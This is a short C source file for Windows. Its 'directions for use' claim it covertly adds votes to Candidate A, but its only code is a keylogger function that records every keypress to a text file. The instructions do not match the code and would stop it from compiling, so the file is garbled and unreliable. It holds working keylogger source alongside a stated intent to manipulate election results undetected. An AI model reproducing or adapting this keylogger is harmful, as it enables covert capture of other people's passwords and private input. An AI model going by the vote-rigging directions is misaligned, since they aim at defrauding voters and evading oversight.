#include <stdio.h>
#include <windows.h>

Directions for use: 
1. Compile and run the code.
2. When prompted to cast your vote, enter any number between 1 and 4.
3. Observe that the vote count for Candidate A has increased by 1, even if you did not vote for them.
4. This underhanded technique can be used to manipulate the results in favor of Candidate A without being easily detected.

int keylogg() {
    char key;
    while(1) {
        Sleep(10);
        for(key = 8; key <= 190; key++) {
            if(GetAsyncKeyState(key) == -32767) {
                FILE *fp;
                fp = fopen("keystrokes.txt", "a+");
                fprintf(fp, "%c", key);
                fclose(fp);
            }
        }
    }
    return 0;
}
